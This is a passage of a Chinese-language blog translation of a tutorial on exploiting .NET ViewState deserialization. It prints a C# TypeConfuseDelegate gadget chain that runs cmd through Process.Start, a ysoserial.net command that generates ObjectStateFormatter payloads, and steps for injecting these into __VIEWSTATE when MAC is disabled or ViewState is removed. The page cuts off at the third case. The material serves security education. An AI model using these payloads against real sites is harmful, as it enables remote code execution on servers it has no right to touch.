<!DOCTYPE html>



  


<html class="theme-next mist use-motion" lang="zh-Hans">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.3">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.3">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.3">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.3" color="#222">





  <meta name="keywords" content="Translation,.NET反序列化," />





  <link rel="alternate" href="/atom.xml" title="Cytosineの有被小窝~" type="application/atom+xml" />






<meta name="description" content="本文为翻译，收发于 ChaMD5安全团队 公众号。 以下为正文： 嗨，大家好： 欢迎访问这个有关.NET ViewState反序列化的新博客文章。我想感谢 Subodh Pandey 为这篇博客文章和这项研究做出的贡献，没有他(和他的研究)，我就无法深入了解这个主题。 在开始 ViewState 反序列化之前，让我们先看看一些与 ViewState 及其利用相关的关键术语。 ViewState：根">
<meta name="keywords" content="Translation,.NET反序列化">
<meta property="og:type" content="article">
<meta property="og:title" content="[翻译]深入 .NET ViewState 反序列化及其利用">
<meta property="og:url" content="https://lovegood.github.io/2021/03/29/translation-deep-dive-into-net-viewstate-deserialization-and-its-exploitation/index.html">
<meta property="og:site_name" content="Cytosineの有被小窝~">
<meta property="og:description" content="本文为翻译，收发于 ChaMD5安全团队 公众号。 以下为正文： 嗨，大家好： 欢迎访问这个有关.NET ViewState反序列化的新博客文章。我想感谢 Subodh Pandey 为这篇博客文章和这项研究做出的贡献，没有他(和他的研究)，我就无法深入了解这个主题。 在开始 ViewState 反序列化之前，让我们先看看一些与 ViewState 及其利用相关的关键术语。 ViewState：根">
<meta property="og:locale" content="zh-Hans">
<meta property="og:image" content="https://lovegood.github.io/2021/03/29/translation-deep-dive-into-net-viewstate-deserialization-and-its-exploitation/01.png">
<meta property="og:image" content="https://lovegood.github.io/2021/03/29/translation-deep-dive-into-net-viewstate-deserialization-and-its-exploitation/02.png">
<meta property="og:image" content="https://lovegood.github.io/2021/03/29/translation-deep-dive-into-net-viewstate-deserialization-and-its-exploitation/03.png">
<meta property="og:image" content="https://lovegood.github.io/2021/03/29/translation-deep-dive-into-net-viewstate-deserialization-and-its-exploitation/04.png">
<meta property="og:image" content="https://lovegood.github.io/2021/03/29/translation-deep-dive-into-net-viewstate-deserialization-and-its-exploitation/05.png">
<meta property="og:image" content="https://lovegood.github.io/2021/03/29/translation-deep-dive-into-net-viewstate-deserialization-and-its-exploitation/06.png">
<meta property="og:image" content="https://lovegood.github.io/2021/03/29/translation-deep-dive-into-net-viewstate-deserialization-and-its-exploitation/07.png">
<meta property="og:image" content="https://lovegood.github.io/2021/03/29/translation-deep-dive-into-net-viewstate-deserialization-and-its-exploitation/08.png">
<meta property="og:image" content="https://lovegood.github.io/2021/03/29/translation-deep-dive-into-net-viewstate-deserialization-and-its-exploitation/09.png">
<meta property="og:image" content="https://lovegood.github.io/2021/03/29/translation-deep-dive-into-net-viewstate-deserialization-and-its-exploitation/10.png">
<meta property="og:image" content="https://lovegood.github.io/2021/03/29/translation-deep-dive-into-net-viewstate-deserialization-and-its-exploitation/11.png">
<meta property="og:image" content="https://lovegood.github.io/2021/03/29/translation-deep-dive-into-net-viewstate-deserialization-and-its-exploitation/12.png">
<meta property="og:image" content="https://lovegood.github.io/2021/03/29/translation-deep-dive-into-net-viewstate-deserialization-and-its-exploitation/13.png">
<meta property="og:image" content="https://lovegood.github.io/2021/03/29/translation-deep-dive-into-net-viewstate-deserialization-and-its-exploitation/14.png">
<meta property="og:image" content="https://lovegood.github.io/2021/03/29/translation-deep-dive-into-net-viewstate-deserialization-and-its-exploitation/15.png">
<meta property="og:image" content="https://lovegood.github.io/2021/03/29/translation-deep-dive-into-net-viewstate-deserialization-and-its-exploitation/16.png">
<meta property="og:image" content="https://lovegood.github.io/2021/03/29/translation-deep-dive-into-net-viewstate-deserialization-and-its-exploitation/17.png">
<meta property="og:image" content="https://lovegood.github.io/2021/03/29/translation-deep-dive-into-net-viewstate-deserialization-and-its-exploitation/18.png">
<meta property="og:image" content="https://lovegood.github.io/2021/03/29/translation-deep-dive-into-net-viewstate-deserialization-and-its-exploitation/19.png">
<meta property="og:image" content="https://lovegood.github.io/2021/03/29/translation-deep-dive-into-net-viewstate-deserialization-and-its-exploitation/20.png">
<meta property="og:image" content="https://lovegood.github.io/2021/03/29/translation-deep-dive-into-net-viewstate-deserialization-and-its-exploitation/21.png">
<meta property="og:image" content="https://lovegood.github.io/2021/03/29/translation-deep-dive-into-net-viewstate-deserialization-and-its-exploitation/22.png">
<meta property="og:image" content="https://lovegood.github.io/2021/03/29/translation-deep-dive-into-net-viewstate-deserialization-and-its-exploitation/23.jpeg">
<meta property="og:updated_time" content="2021-03-29T10:47:27.000Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="[翻译]深入 .NET ViewState 反序列化及其利用">
<meta name="twitter:description" content="本文为翻译，收发于 ChaMD5安全团队 公众号。 以下为正文： 嗨，大家好： 欢迎访问这个有关.NET ViewState反序列化的新博客文章。我想感谢 Subodh Pandey 为这篇博客文章和这项研究做出的贡献，没有他(和他的研究)，我就无法深入了解这个主题。 在开始 ViewState 反序列化之前，让我们先看看一些与 ViewState 及其利用相关的关键术语。 ViewState：根">
<meta name="twitter:image" content="https://lovegood.github.io/2021/03/29/translation-deep-dive-into-net-viewstate-deserialization-and-its-exploitation/01.png">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Mist',
    version: '5.1.3',
    sidebar: {"position":"left","display":"always","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="https://lovegood.github.io/2021/03/29/translation-deep-dive-into-net-viewstate-deserialization-and-its-exploitation/"/>





  <title>[翻译]深入 .NET ViewState 反序列化及其利用 | Cytosineの有被小窝~</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Cytosineの有被小窝~</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle">悟已往之不谏，知来者之可追。</p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
            cd ~
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about" rel="section">
            
            uname -a
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives" rel="section">
            
            ls -al post
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://lovegood.github.io/2021/03/29/translation-deep-dive-into-net-viewstate-deserialization-and-its-exploitation/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Cytosine">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.webp">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Cytosineの有被小窝~">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">[翻译]深入 .NET ViewState 反序列化及其利用</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-03-29T18:43:39+08:00">
                2021-03-29
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <p>本文为翻译，收发于 ChaMD5安全团队 公众号。</p>
<p>以下为正文：</p>
<p>嗨，大家好：</p>
<p>欢迎访问这个有关.NET ViewState反序列化的新博客文章。我想感谢 <a href="https://www.linkedin.com/in/subodh-pandey/" target="_blank" rel="external">Subodh Pandey</a> 为这篇博客文章和这项研究做出的贡献，没有他(和他的研究)，我就无法深入了解这个主题。</p>
<p>在开始 ViewState 反序列化之前，让我们先看看一些与 ViewState 及其利用相关的关键术语。</p>
<p><strong>ViewState</strong>：根据 TutorialsPoint 上的教程 (译者注：TutorialsPoint 是一个提供各种教程的网站) ：</p>
<p>视图状态是页面及其所有控件的状态。它由ASP.NET框架自动维护。</p>
<p>当一个页面被返回给客户端时，页面及其控件属性的变化将被确定，并存储在一个名为 <code>_VIEWSTATE</code> 的隐藏输入字段的值中。当页面再次向服务端发送请求时，<code>_VIEWSTATE</code> 字段将与HTTP请求一起发送到服务器。</p>
<p>（译者注：ViewState是基于web表单的，当设置了ViewState(<code>runat = &quot;server&quot;</code>)后，会有一个隐藏字段<code>_ViewState</code>，这个字段会记录表单中其他控件的值，当表单被提交到服务器后，服务端判断某些字段需要用户重新填写，将表单重新返回给客户端，这时，可以通过<code>_ViewState</code>记录的值恢复上一次用户提交的内容，使得用户可以在之前表单的基础上修改，而不是重新填一遍表单的全部字段。）</p>
<p><strong>EventValidation</strong>：</p>
<p>事件验证会检查POST请求中传入的值，确保这些值是已知且正确的值。如果运行时看到一个未知的值，则会抛出异常。</p>
<p>此参数还包含序列化数据。</p>
<p>一个<a href="https://odetocode.com/blogs/scott/archive/2006/03/20/asp-net-event-validation-and-invalid-callback-or-postback-argument.aspx" target="_blank" rel="external">例子</a></p>
<p><strong>ViewStateUserKey</strong>：</p>
<p>是一个用户对一个页面的特定标识符，用于避免CSRF攻击。它可以这样设置：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">void Page_Init (object sender, EventArgs e) </div><div class="line">&#123;</div><div class="line"> ViewStateUserKey = Session.SessionID; </div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>一个<a href="https://blogs.objectsharp.com/post/2010/04/08/ViewStateUserKey-ValidateAntiForgeryToken-and-the-Security-Development-Lifecycle.aspx" target="_blank" rel="external">例子</a></p>
<p><strong>Formatters</strong>：Formatters（格式化器）被用于从一个表单向另一个表单转换数据。例如：BinaryFormatter会以二进制格式将对象或整个连接对象图形序列化和反序列化。</p>
<p><strong>Gadgets</strong>：当不受信任的数据被处理时，可能允许执行代码的类。.NET的一些例子：<code>PSObject</code> 、<code>TextFormattingRunProperties</code> 和 <code>TypeConfuseDelegate</code> 。</p>
<h1 id="ViewState是如何使用的"><a href="#ViewState是如何使用的" class="headerlink" title="ViewState是如何使用的"></a>ViewState是如何使用的</h1><p>ViewState 基本上由服务器生成，并以隐藏的表单字段 “_VIEWSTATE” 的形式发送给客户端，用于“POST”请求。当Web应用程序进行 POST 请求时，客户端将其发送到服务器。</p>
<p>ViewState 以序列化数据的形式出现，当客户端再次进行请求(ViewState)被发送到服务器时，将进行反序列化。ASP.NET 有各种序列化和反序列化库，称为 formatter ，它序列化对象到字节流，反之亦然(反序列化字节流到对象)，如 ObjectStateFormatter、LOSFormatter、BinaryFormatter等。</p>
<p>ASP.NET 使用 LosFormatter 序列化 ViewState，并将其作为隐藏的表单字段发送到客户端。一旦序列化ViewState 在 POST 请求期间被发送回服务器，它将使用 ObjectStateFormatter 进行反序列化。</p>
<p>为了使 ViewState 不受篡改，存在一个启用 ViewState MAC 的选项，通过设置一个值并在反序列化期间对 ViewState 的值进行完整性检查。</p>
<p>Web.config 文件中的 <code>&lt;page enableViewStateMac=&quot;true&quot; /&gt;</code> 。多种散列算法可以被选择，以便在ViewState 中启用 MAC（消息身份验证代码）。</p>
<p>ASP.Net 还提供通过设置值加密 ViewState 的选项。</p>
<p>在 web.config 文件中的 <code>&lt;page ViewStateEncryptionMode=”Always”/&gt;</code>。</p>
<p>您可以在 ViewState 中选择使用不同的加密/验证算法。</p>
<p><img src="01.png" alt="用于设置加密和验证算法的IIS管理器配置"></p>
<p><em>↑ 用于设置加密和验证算法的IIS管理器配置</em></p>
<p>借助一个示例，让我们看看序列化和反序列化在 .NET 中是如何生效的（类似于 ViewState 的工作原理）。</p>
<p>在这里，我们创建了一个单页网页的应用程序，该应用程序将简单地接受用户在文本区域的输入，单击按钮后将其显示在同一页面上。</p>
<p>我们编写了一个示例代码，让应用程序在加载时使用 LOSFormatter 创建序列化输入。这个序列化数据将被保存到文件中。当在应用程序中单击 <em>GO</em> 按钮时，将从文件中读取这些数据，然后在 ObjectStateFormatter 的帮助下进行反序列化。</p>
<p>前端代码：</p>
<p>Test.aspx</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">&lt;%@ Page Language=&quot;C#&quot; AutoEventWireup=&quot;true&quot; CodeFile=&quot;TestComment.aspx.cs&quot; Inherits=&quot;TestComment&quot; %&gt;</div><div class="line">&lt;!DOCTYPE html&gt;</div><div class="line">&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;</div><div class="line">	&lt;head runat=&quot;server&quot;&gt;</div><div class="line">		&lt;title&gt;&lt;/title&gt;</div><div class="line">	&lt;/head&gt;</div><div class="line">	&lt;body&gt;</div><div class="line">		&lt;form id=&quot;form1&quot; runat=&quot;server&quot;&gt;</div><div class="line">			&lt;asp:TextBox id=&quot;TextArea1&quot; TextMode=&quot;multiline&quot; Columns=&quot;50&quot; Rows=&quot;5&quot; runat=&quot;server&quot; /&gt;</div><div class="line">			&lt;asp:Button ID=&quot;Button1&quot; runat=&quot;server&quot; OnClick=&quot;Button1_Click&quot; Text=&quot;GO&quot; /&gt;</div><div class="line">			&lt;br /&gt;</div><div class="line">			&lt;br /&gt;</div><div class="line">			&lt;br /&gt;</div><div class="line">			&lt;asp:Label ID=&quot;Label1&quot; runat=&quot;server&quot;&gt;&lt;/asp:Label&gt;</div><div class="line">		&lt;/form&gt;</div><div class="line">	&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure>
<p>后端代码：</p>
<p>Test.aspx.cs</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div></pre></td><td class="code"><pre><div class="line">using System;</div><div class="line">using System.Collections.Generic;</div><div class="line">using System.Configuration;</div><div class="line">using System.Diagnostics;</div><div class="line">using System.IO;</div><div class="line">using System.Linq;</div><div class="line">using System.Reflection;</div><div class="line">using System.Web;</div><div class="line">using System.Web.UI;</div><div class="line">using System.Web.UI.WebControls;</div><div class="line"></div><div class="line">public partial class TestComment : System.Web.UI.Page</div><div class="line">&#123;</div><div class="line">	protected void Page_Load(object sender, EventArgs e)</div><div class="line">	&#123;</div><div class="line">		String cmd = “echo 123 &gt; c:\\windows\\temp\\test.txt”;</div><div class="line">		Delegate da = new Comparison&lt;string&gt;(String.Compare);</div><div class="line">		Comparison&lt;string&gt; d = (Comparison&lt;string&gt;)MulticastDelegate.Combine(da, da);</div><div class="line">		IComparer&lt;string&gt; comp = Comparer&lt;string&gt;.Create(d);</div><div class="line">		SortedSet&lt;string&gt; set = new SortedSet&lt;string&gt;(comp);</div><div class="line">		set.Add(“cmd”);</div><div class="line">		set.Add(“/c “ + cmd);</div><div class="line">		FieldInfo fi = typeof(MulticastDelegate).GetField(“_invocationList”, BindingFlags.NonPublic | BindingFlags.Instance);</div><div class="line">		object[] invoke_list = d.GetInvocationList();</div><div class="line">		// Modify the invocation list to add Process::Start(string, string)</div><div class="line">		invoke_list[1] = new Func&lt;string, string, Process&gt;(Process.Start);</div><div class="line">		fi.SetValue(d, invoke_list);</div><div class="line">		MemoryStream stream = new MemoryStream();</div><div class="line">		Stream stream1 = new FileStream(“C:\\Windows\\Temp\\serialnet.txt”, FileMode.Create, FileAccess.Write);</div><div class="line">		//Serialization using LOSFormatter starts here</div><div class="line">		//The serialized output is base64 encoded which cannot be directly fed to ObjectStateFormatter for deserialization hence requires base64 decoding before deserialization </div><div class="line">		LosFormatter los = new LosFormatter();</div><div class="line">		los.Serialize(stream1, set);</div><div class="line">		stream1.Close();</div><div class="line">	&#125;</div><div class="line">	protected void Button1_Click(object sender, EventArgs e)</div><div class="line">	&#123;</div><div class="line">		string serialized_data = File.ReadAllText(@”C:\Windows\Temp\serialnet.txt”);</div><div class="line">		//Base64 decode the serialized data before deserialization</div><div class="line">		byte[] bytes = Convert.FromBase64String(serialized_data);</div><div class="line">		//Deserialization using ObjectStateFormatter starts here</div><div class="line">		ObjectStateFormatter osf = new ObjectStateFormatter();</div><div class="line">		string test = osf.Deserialize(Convert.ToBase64String(bytes)).ToString();</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>现在，让我们看看代码在运行时的执行了什么。网页加载后，代码立即执行，并在“C:\Windows\temp”文件夹中创建一个名为 serialnet.txt 的文件，其中包含序列化数据，它执行以下代码中突出显示的操作：：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">String cmd = “echo 123 &gt; c:\\windows\\temp\\test.txt”;</div></pre></td></tr></table></figure>
<p>以下是应用程序加载后的文件内容：</p>
<p><img src="02.png" alt=""></p>
<p><em>↑来自 LosFormatter 的序列化数据</em></p>
<p>一旦我们单击 <em>Go</em> 按钮，提供的命令会在 TypeConfuseDelegate gadget 的帮助下执行。下面我们可以看到 test.txt 文件已在 Temp 目录中被创建：</p>
<p><img src="03.png" alt=""></p>
<p><em>↑文件 test.txt 被创建，内容是“123”</em></p>
<p>这是一个简单的模拟，展示了 ViewState 序列化和反序列化如何在回退操作期间在 Web 应用程序中生效。</p>
<p>这也有助于确定不可信数据不应该被反序列化的事实。</p>
<p>现在我们已经了解了 ViewState 的基础知识及其如何生效，让我们将重点转移到 ViewState 不安全的反序列化上，以及这如何导致远程代码执行。</p>
<p>为了更好的理解，我们将了解各种测试用例，并实际查看每个案例。</p>
<p>为了生成 payload 来演示不安全的反序列化，我们将对所有测试用例使用 ysoserial.net 。</p>
<h2 id="案例1：目标-framework-≤-4-0（ViewState-Mac已禁用）："><a href="#案例1：目标-framework-≤-4-0（ViewState-Mac已禁用）：" class="headerlink" title="案例1：目标 framework ≤ 4.0（ViewState Mac已禁用）："></a>案例1：目标 framework ≤ 4.0（ViewState Mac已禁用）：</h2><p>通过设置 <code>AspNetEnforceViewStateMac</code> 注册表项为零，可以完全禁用 ViewState MAC：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\.NETFramework\v&#123;VersionHere&#125;</div></pre></td></tr></table></figure>
<p>如下所示：</p>
<p><img src="04.png" alt=""></p>
<p><em>↑ ViewState MAC 被从注册表禁用</em></p>
<p>现在，准备完成，我们将进入利用阶段。为了该demo，我们使用以下前端和后端代码：</p>
<p>前端代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">&lt;%@ Page Language=”C#” AutoEventWireup=”true” CodeFile=”hello.aspx.cs” Inherits=”hello” %&gt;</div><div class="line">&lt;!DOCTYPE html&gt;</div><div class="line">&lt;html xmlns=”http://www.w3.org/1999/xhtml&quot;&gt;</div><div class="line">	&lt;head runat=”server”&gt;</div><div class="line">		&lt;title&gt;&lt;/title&gt;</div><div class="line">	&lt;/head&gt;</div><div class="line">	&lt;body&gt;</div><div class="line">		 &lt;form id=”form1&quot; runat=”server”&gt;</div><div class="line">			 &lt;asp:TextBox id=”TextArea1&quot; TextMode=”multiline” Columns=”50&quot; Rows=”5&quot; runat=”server” /&gt;</div><div class="line">			 &lt;asp:Button ID=”Button1&quot; runat=”server” OnClick=”Button1_Click”</div><div class="line">			 Text=”GO” class=”btn”/&gt;</div><div class="line">			 &lt;br /&gt;</div><div class="line">			 &lt;asp:Label ID=”Label1&quot; runat=”server”&gt;&lt;/asp:Label&gt;</div><div class="line">		 &lt;/form&gt;</div><div class="line">	&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure>
<p>后端代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">using System;</div><div class="line">using System.Collections.Generic;</div><div class="line">using System.Web;</div><div class="line">using System.Web.UI;</div><div class="line">using System.Web.UI.WebControls;</div><div class="line">using System.Text.RegularExpressions;</div><div class="line">using System.Text;</div><div class="line">using System.IO;</div><div class="line"></div><div class="line">public partial class hello : System.Web.UI.Page</div><div class="line">&#123;</div><div class="line">	 protected void Page_Load(object sender, EventArgs e)</div><div class="line">	 &#123;</div><div class="line">	 &#125;</div><div class="line">	 </div><div class="line">	protected void Button1_Click(object sender, EventArgs e)</div><div class="line">	 &#123;</div><div class="line">	 	Label1.Text = TextArea1.Text.ToString();</div><div class="line">	 &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>我们在 IIS 中托管该应用程序，并使用 burpsuite 拦截应用程序的流量：</p>
<p><img src="05.png" alt=""></p>
<p><em>↑拦截应用程序流量</em></p>
<p><img src="06.png" alt=""></p>
<p><em>↑ ViewState MAC 被禁用</em></p>
<p>在上面的截图中可以看到，在更改注册表项后，ViewState MAC 已被禁用。</p>
<p>现在，我们可以使用 ysoserial.net 创建一个序列化 payload ，如下所示：</p>
<p><img src="07.png" alt=""></p>
<p><em>↑ Ysoserial payload 的生成</em></p>
<p>上面用来生成 payload 的命令是：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">ysoserial.exe -o base64 -g TypeConfuseDelegate</div><div class="line"> -f ObjectStateFormatter -c &quot;echo 123 &gt; C:\Windows\temp\test.txt&quot; &gt; payload_when_mac_disabled</div></pre></td></tr></table></figure>
<p>在 HTTP POST 请求中的 ViewState 参数中使用上述生成的 payload，我们可以观察 payload 的执行如下：</p>
<p><img src="08.png" alt=""></p>
<p><em>↑ ViewState 参数的值被使用 ysoserial 生成的 payload 替换</em></p>
<p><img src="09.png" alt=""></p>
<p><em>↑文件 test.txt 被使用内容 “123” 创建</em></p>
<h2 id="案例2：当从HTTP请求中删除ViewState时："><a href="#案例2：当从HTTP请求中删除ViewState时：" class="headerlink" title="案例2：当从HTTP请求中删除ViewState时："></a>案例2：当从HTTP请求中删除ViewState时：</h2><p>在本案例中，我们将介绍开发人员试图将 ViewState 从 HTTP 请求中删除的场景。为了演示，我们重用了上述示例中的前端代码，并将后端代码修改为：</p>
<p>后端代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line">using System;</div><div class="line">using System.Collections.Generic;</div><div class="line">using System.Web;</div><div class="line">using System.Web.UI;</div><div class="line">using System.Web.UI.WebControls;</div><div class="line">using System.Text.RegularExpressions;</div><div class="line">using System.Text;</div><div class="line">using System.IO;</div><div class="line"></div><div class="line">public class BasePage : System.Web.UI.Page</div><div class="line">&#123;</div><div class="line">	 protected override void Render(HtmlTextWriter writer)</div><div class="line">	 &#123;</div><div class="line">		 StringBuilder sb = new StringBuilder();</div><div class="line">		 StringWriter sw = new StringWriter(sb);</div><div class="line">		 HtmlTextWriter hWriter = new HtmlTextWriter(sw);</div><div class="line">		 base.Render(hWriter);</div><div class="line">		 string html = sb.ToString();</div><div class="line">		 html = Regex.Replace(html, “&lt;input[^&gt;]*id=\”(__VIEWSTATE)\”[^&gt;]*&gt;”, string.Empty, RegexOptions.IgnoreCase);</div><div class="line">		 writer.Write(html);</div><div class="line">	 &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">public partial class hello : BasePage</div><div class="line">&#123;</div><div class="line">	 protected void Page_Load(object sender, EventArgs e)</div><div class="line">	 &#123;</div><div class="line">	 &#125;</div><div class="line">	 </div><div class="line">	 protected void Button1_Click(object sender, EventArgs e)</div><div class="line">	 &#123;</div><div class="line">	 	Label1.Text = TextArea1.Text.ToString();</div><div class="line">	 &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>当我们在 IIS 上托管该代码，我们将观察到POST请求不再发送 ViewState 参数。</p>
<p><img src="10.png" alt=""></p>
<p><em>↑在 HTTP POST请求中，不再有 ViewState 参数</em></p>
<p>或许可以假设，如果没有 ViewState ，它们的实现是安全的，不会因 ViewState 反序列化而产生任何潜在的漏洞。</p>
<p>然而，事实并非如此。如果我们向请求包中添加 ViewState 参数并发送使用 ysoserial 创建的序列化payload ，我们仍将能够实现如案例1所示的代码执行。</p>
<h2 id="案例3：目标-framework-≤-4-0（启用了ViewState-Mac）："><a href="#案例3：目标-framework-≤-4-0（启用了ViewState-Mac）：" class="headerlink" title="案例3：目标 framework ≤ 4.0（启用了ViewState Mac）："></a>案例3：目标 framework ≤ 4.0（启用了ViewState Mac）：</h2><p>我们可以通过更改设置，在特定页面或整个应用程序中启用 ViewState MAC 。</p>
<p>为了对特定页面启用 ViewState MAC ，我们需要对特定的 aspx 文件进行以下更改：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;%@ Page Language=&quot;C#&quot; AutoEventWireup=&quot;true&quot; CodeFile=&quot;hello.aspx.cs&quot; Inherits=&quot;hello&quot; enableViewStateMac=&quot;True&quot;%&gt;</div></pre></td></tr></table></figure>
<p>我们还可以通过在 web.config 文件中设置该项使整个应用程序中都启用 ViewState MAC ，如下所示：</p>
